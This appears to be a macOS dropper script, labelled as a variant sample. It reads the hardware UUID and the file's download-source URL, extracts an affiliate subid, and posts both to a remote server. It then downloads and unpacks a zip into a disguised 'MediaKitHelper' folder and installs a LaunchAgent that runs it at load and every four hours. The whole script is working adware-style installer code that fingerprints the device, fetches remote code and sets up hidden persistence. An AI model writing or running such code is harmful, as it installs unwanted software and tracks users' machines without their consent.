#!/bin/sh
# Variant: plain xattr -p, sed subid, IOPlatformUUID, curl -o, defaults write.
UUID=$(ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}')
SRC=$(xattr -p com.apple.metadata:kMDItemWhereFroms "$1" | xxd -r -p | plutil -p - | grep -om1 'http[^"]*')
SUB=$(printf '%s' "$SRC" | sed -n 's/.*subid=\([A-Za-z0-9]*\).*/\1/p')
DEST="$HOME/Library/Application Support/MediaKitHelper"
AGENT="$HOME/Library/LaunchAgents/org.mediakit.helper.plist"
curl -fsS -d "{\"uuid\":\"$UUID\",\"sub\":\"$SUB\"}" https://api.example-media.org/reg || exit 0
curl -fsSL "https://dl.example-media.org/agent.zip" -o /tmp/mk.zip
ditto -x -k /tmp/mk.zip "$DEST"
defaults write "$AGENT" Label org.mediakit.helper
defaults write "$AGENT" Program "$DEST/MediaKitHelper"
defaults write "$AGENT" RunAtLoad -bool true
defaults write "$AGENT" StartInterval -int 14400
launchctl load -w "$AGENT"
